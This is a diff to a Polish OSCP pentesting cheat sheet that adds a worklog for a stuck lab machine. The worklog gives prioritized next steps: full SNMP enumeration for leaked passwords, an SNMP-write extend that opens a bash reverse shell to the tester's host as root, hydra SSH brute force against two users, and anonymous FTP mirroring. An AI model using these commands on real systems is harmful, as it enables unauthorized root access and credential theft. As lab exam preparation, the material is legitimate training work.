@@ -26,6 +26,7 @@
 | [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
 | [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
 | [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
+| [15](#15-wszystko-i-nic-worklog--stuck-buster) | **Wszystko i nic** | Worklog utkniętych maszyn: co zrobione + co spróbować dalej |
 | [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
 | [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |
 
@@ -3160,6 +3161,83 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 > - **Testing Environment Considerations** — okoliczności łagodzące (późne creds, za mało czasu vs za duży scope).
 > - **Technical Summary** — grupuj findingi po obszarach (Auth / Access Control / Patch Mgmt / Misconfig) + risk heat map; XSS+SQLi+upload razem = systemowy problem (niesanityzowany input → szkolenie devów).
 > - **Remediation** — konkretna, NIE warstwowa (każdy krok = osobne rozwiązanie), różna per klient (szpital: izolacja/patch-later; bank: brak patcha = critical). Unikaj fixów, których nikt nie wdroży.
+
+---
+
+# 15. Wszystko i nic (worklog / stuck-buster)
+
+> **Do czego to jest:** kiedy utknę na maszynie, wrzucam ją tu. Format: `## <IP> — <opis> — STATUS`, w środku **Zrobione**, **Analiza (co przeoczone)** i **Co spróbować (priorytet)**. Kiero mówi „mam problem z .X, sprawdź raporty" → aktualizuję odpowiedni wpis.
+
+---
+
+## 192.168.111.149 — Linux Ubuntu 18.04 (FTP/SSH/Apache/SNMP) — 🔴 STUCK
+
+**Porty:** 21 vsftpd 3.0.3 · 22 OpenSSH 8.2p1 · 80 Apache 2.4.41 (default page) · **161/udp SNMP (community `public`)**
+
+### ✅ Zrobione
+- Nmap TCP + UDP (161 snmp open).
+- `snmpwalk -c public -v1` → system info: host `...-149-ubuntu1804-kiero-...`, kontakt `me@example.org`.
+- `snmpwalk` NET-SNMP-EXTEND-MIB → **extend „RESET" = `./home/john/RESET_PASSWD`** → output: *„Resetting password of **kiero** to the default value"*.
+- gobuster :80 (bez wyniku w raporcie).
+- LFI na Apache → nic (**spodziewane** — strona to statyczny default „It works", nie ma parametru do LFI; to ślepy zaułek, odpuść).
+
+### 🔎 Analiza — co Ci mówi SNMP (przeoczone tropy)
+1. **Masz już dwóch userów: `john` i `kiero`.** To są konta SSH do zaatakowania.
+2. **Hint „resetuje hasło kiero do wartości domyślnej"** = kiero ma słabe/domyślne hasło → **SSH jako kiero** to prawdopodobna ścieżka wejścia.
+3. **Zrobiłeś tylko 2 gałęzie SNMP.** Nie zrobiłeś **pełnego walka** — a tam (w tabeli procesów) hasła wyciekają z linii poleceń. To jest to, czego nie umiesz — ściąga niżej.
+4. **Jest skonfigurowany extend** → jeśli istnieje community **z prawem zapisu** (RW), SNMP daje **RCE jako root** (snmpd chodzi zwykle jako root). To potencjalnie instant-win.
+
+### 🎯 Co spróbować — w tej kolejności
+```bash
+KALI=192.168.45.239; T=192.168.111.149
+# ── 1. PEŁNY snmpwalk (najpierw to — tu leca creds z cmdline procesow) ──
+snmpwalk -v2c -c public $T .1 > snmp_full.txt                 # zrzut CALEGO drzewa
+snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.5             # PARAMETRY procesow <- hasla!
+grep -iE 'pass|pwd|user|-c |mysql|ftp|key' snmp_full.txt      # przekop zrzut
+snmp-check $T -c public                                        # ladny, poukladany widok
+
+# ── 2. SNMP write -> RCE jako root (jesli istnieje RW community) ──
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $T  # znajdz community
+snmpset -v2c -c private $T iso.3.6.1.2.1.1.6.0 s TEST          # przechodzi = MASZ zapis (default RW: private)
+#   jesli zapis dziala -> zarejestruj wlasny extend i wykonaj jako root:
+snmpset -v2c -c private $T 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
+  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
+  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$KALI/4444 0>&1'" \
+  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
+#   nc -lvnp 4444 PRZED tym; odczyt outputu = uruchomienie komendy (run-on-read):
+snmpwalk -v2c -c private $T 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
+
+# ── 3. SSH jako kiero/john (hint o domyslnym hasle) ──
+hydra -l kiero -P /usr/share/wordlists/rockyou.txt ssh://$T -t 4 -f    # -f = stop po trafieniu
+hydra -l john  -P /usr/share/wordlists/rockyou.txt ssh://$T -t 4 -f
+#   zgadnij tez recznie: kiero:kiero, kiero:password, kiero:kiero123
+
+# ── 4. FTP anonymous (szybki strzal) ──
+ftp $T            # login: anonymous  haslo: anonymous  (lub puste)
+wget -m --no-passive "ftp://anonymous:anonymous@$T/"                   # zrzuc co widac
+
+# ── 5. Web re-enum (NISKI priorytet — LFI odpadlo) ──
+gobuster dir -u http://$T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40
+```
+
+### 📚 snmpwalk — ściąga (bo pytałeś)
+```bash
+# Skladnia:  snmpwalk -v<wersja> -c <community> <IP> [OID]
+#   -v1 / -v2c  = wersja protokolu (v2c SZYBSZE, uzywaj domyslnie; -v1 tylko gdy v2c milczy)
+#   -c public   = community string (jak "haslo" tylko-do-odczytu; default RO=public, RW=private)
+#   brak OID    = zrzuca CALE drzewo od korzenia (.1)
+snmpwalk -v2c -c public $T                       # wszystko
+snmpwalk -v2c -c public $T system                # tylko galaz 'system'
+# Najcenniejsze OIDy (naucz sie tych 4):
+#   1.3.6.1.2.1.25.4.2.1.2  hrSWRunName        nazwy uruchomionych procesow
+#   1.3.6.1.2.1.25.4.2.1.4  hrSWRunPath        sciezki binarek
+#   1.3.6.1.2.1.25.4.2.1.5  hrSWRunParameters  ARGUMENTY procesow  <-- tu wyciekaja hasla
+#   1.3.6.1.2.1.25.6.3.1.2  hrSWInstalledName  zainstalowany software
+# Gdy brakuje nazw MIB (widzisz iso.3.6...): sudo apt install snmp-mibs-downloader
+#   i zakomentuj 'mibs :' w /etc/snmp/snmp.conf  -> beda ladne nazwy zamiast cyfr.
+```
+
+> 💡 **Mój typ na tę maszynę:** wejście przez **SSH jako kiero** (krok 3) lub **SNMP-write→root** (krok 2). Pełny walk (krok 1) zrób i tak — nauczysz się i możesz złapać hasło po drodze. Web = zaułek. Napisz mi co zwróciły kroki 1–4, to zawężę.
 
 ---
 
